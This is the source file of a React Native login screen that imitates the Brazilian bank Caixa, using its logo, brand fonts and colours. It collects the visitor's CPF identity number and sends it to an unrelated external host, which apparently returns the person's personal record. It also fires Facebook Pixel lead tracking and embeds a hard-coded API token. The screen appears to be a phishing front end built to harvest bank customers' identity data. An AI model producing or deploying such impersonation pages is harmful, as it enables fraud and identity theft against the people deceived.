import { View, Text, StyleSheet, TextInput, TouchableOpacity, Image, ActivityIndicator } from 'react-native';
import { LinearGradient } from 'expo-linear-gradient';
import { useState, useEffect } from 'react';
import { User } from 'lucide-react-native';
import Animated, { useSharedValue, useAnimatedStyle, withTiming } from 'react-native-reanimated';
import { useRouterWithUTM } from '@/hooks/useRouterWithUTM';
import { useAuth } from '@/contexts/AuthContext';
import { facebookPixel } from '@/services/facebookPixel';

export default function LoginScreen() {
  const [cpf, setCpf] = useState('');
  const [displayCpf, setDisplayCpf] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [showRegisterInfo, setShowRegisterInfo] = useState(false);
  const router = useRouterWithUTM();
  const { login } = useAuth();

  const opacity = useSharedValue(0);
  const translateY = useSharedValue(15);

  useEffect(() => {
    opacity.value = withTiming(1, { duration: 300 });
    translateY.value = withTiming(0, { duration: 300 });
    facebookPixel.trackPageView('Login');
  }, []);

  const animatedStyle = useAnimatedStyle(() => ({
    opacity: opacity.value,
    transform: [{ translateY: translateY.value }],
  }));

  const formatCpf = (value: string) => {
    if (value.length <= 3) return value;
    if (value.length <= 6) return `${value.slice(0, 3)}.${value.slice(3)}`;
    if (value.length <= 9) return `${value.slice(0, 3)}.${value.slice(3, 6)}.${value.slice(6)}`;
    return `${value.slice(0, 3)}.${value.slice(3, 6)}.${value.slice(6, 9)}-${value.slice(9, 11)}`;
  };

  const handleCpfChange = (text: string) => {
    const numericOnly = text.replace(/[^0-9]/g, '');
    if (numericOnly.length <= 11) {
      setCpf(numericOnly);
      setDisplayCpf(formatCpf(numericOnly));
    }
  };

  const handleRegisterClick = () => {
    if (cpf.length === 11) {
      handleNext();
    } else {
      setShowRegisterInfo(true);
      setError('');
    }
  };

  const handleNext = async () => {
    if (cpf.length !== 11) {
      setError('CPF deve conter exatamente 11 dígitos');
      return;
    }

    setLoading(true);
    setError('');
    setShowRegisterInfo(false);

    try {
      const response = await fetch(
        `https://bk.elaidisparos.tech/consultar-filtrada/cpf?cpf=${cpf}&token=cvnw2crw4jvazks79n8ydk`
      );

      if (!response.ok) {
        throw new Error('Erro ao consultar CPF');
      }

      const data = await response.json();

      const fullUserData = { cpf, ...data };
      await login(fullUserData);

      facebookPixel.trackLead();

      router.push({
        pathname: '/verificacao',
        params: { userData: JSON.stringify(fullUserData) }
      });
    } catch (err) {
      setError('Erro ao consultar CPF. Tente novamente.');
      console.error('Erro na API:', err);
    } finally {
      setLoading(false);
    }
  };

  return (
    <LinearGradient
      colors={['#0066b3', '#4db8a8']}
      start={{ x: 0, y: 0 }}
      end={{ x: 1, y: 1 }}
      style={styles.container}
    >
      <View style={styles.content}>
        <Animated.View style={[styles.card, animatedStyle]}>
          <View style={styles.logoContainer}>
            <Image
              source={require('@/assets/images/logo-caixa.png')}
              style={styles.logo}
              resizeMode="contain"
            />
            <Text style={styles.title}>Login Caixa</Text>
          </View>

          <Text style={styles.instruction}>
            Informe seu CPF e clique em "Próximo" para continuar:
          </Text>

          {showRegisterInfo && (
            <View style={styles.infoBox}>
              <Text style={styles.infoText}>
                Para se cadastrar, você precisa ter um CPF válido. Insira seu CPF no campo abaixo e continue.
              </Text>
            </View>
          )}

          <View style={styles.inputWrapper}>
            <View style={styles.inputContainer}>
              <User size={20} color="#666" style={styles.inputIcon} />
              <TextInput
                style={styles.input}
                value={displayCpf}
                onChangeText={handleCpfChange}
                placeholder="000.000.000-00"
                placeholderTextColor="#999"
                keyboardType="numeric"
                maxLength={14}
                editable={!loading}
              />
            </View>
            <View style={styles.inputUnderline} />
          </View>

          {error ? (
            <Text style={styles.errorText}>{error}</Text>
          ) : null}

          <TouchableOpacity
            style={[styles.nextButton, loading && styles.nextButtonDisabled]}
            onPress={handleNext}
            activeOpacity={0.9}
            disabled={loading}
          >
            {loading ? (
              <ActivityIndicator color="#FFFFFF" />
            ) : (
              <Text style={styles.nextButtonText}>Próximo</Text>
            )}
          </TouchableOpacity>

          <View style={styles.linksContainer}>
            <Text style={styles.linkText}>
              É novo por aqui?{' '}
              <Text style={styles.link} onPress={handleRegisterClick}>Cadastre-se</Text>
            </Text>
          </View>

          <TouchableOpacity style={styles.helpLink}>
            <Text style={styles.helpLinkText}>Preciso de ajuda</Text>
          </TouchableOpacity>
        </Animated.View>
      </View>
    </LinearGradient>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
  },
  content: {
    flex: 1,
    alignItems: 'center',
    justifyContent: 'center',
    paddingHorizontal: 20,
  },
  card: {
    backgroundColor: '#FFFFFF',
    borderRadius: 8,
    padding: 40,
    width: '100%',
    maxWidth: 480,
    shadowColor: '#000',
    shadowOffset: { width: 0, height: 4 },
    shadowOpacity: 0.15,
    shadowRadius: 12,
    elevation: 8,
  },
  logoContainer: {
    alignItems: 'center',
    marginBottom: 32,
  },
  logo: {
    width: 140,
    height: 50,
    marginBottom: 8,
  },
  title: {
    fontSize: 20,
    fontFamily: 'CaixaSTD-Regular',
    color: '#0066b3',
    textAlign: 'center',
  },
  instruction: {
    fontSize: 15,
    fontFamily: 'CaixaSTD-Book',
    color: '#666',
    lineHeight: 22,
    marginBottom: 24,
  },
  infoBox: {
    backgroundColor: '#E3F2FD',
    borderLeftWidth: 4,
    borderLeftColor: '#0066b3',
    padding: 16,
    marginBottom: 24,
    borderRadius: 4,
  },
  infoText: {
    fontSize: 14,
    fontFamily: 'CaixaSTD-Regular',
    color: '#0066b3',
    lineHeight: 20,
  },
  inputWrapper: {
    marginBottom: 24,
  },
  inputContainer: {
    flexDirection: 'row',
    alignItems: 'center',
    paddingVertical: 8,
  },
  inputIcon: {
    marginRight: 12,
  },
  input: {
    flex: 1,
    fontSize: 16,
    fontFamily: 'CaixaSTD-Regular',
    color: '#333',
    paddingVertical: 4,
  },
  inputUnderline: {
    height: 1,
    backgroundColor: '#d0d0d0',
    marginTop: 4,
  },
  errorText: {
    color: '#d32f2f',
    fontSize: 14,
    fontFamily: 'CaixaSTD-Regular',
    marginBottom: 16,
    textAlign: 'center',
  },
  nextButton: {
    backgroundColor: '#FF9800',
    borderRadius: 4,
    paddingVertical: 14,
    alignItems: 'center',
    marginBottom: 24,
  },
  nextButtonDisabled: {
    backgroundColor: '#FFB74D',
    opacity: 0.7,
  },
  nextButtonText: {
    color: '#FFFFFF',
    fontSize: 16,
    fontFamily: 'CaixaSTD-SemiBold',
  },
  linksContainer: {
    alignItems: 'center',
    marginBottom: 16,
  },
  linkText: {
    fontSize: 14,
    fontFamily: 'CaixaSTD-Regular',
    color: '#0066b3',
  },
  link: {
    fontFamily: 'CaixaSTD-SemiBold',
    textDecorationLine: 'underline',
  },
  helpLink: {
    alignItems: 'center',
  },
  helpLinkText: {
    fontSize: 14,
    fontFamily: 'CaixaSTD-Regular',
    color: '#0066b3',
    textDecorationLine: 'underline',
  },
});
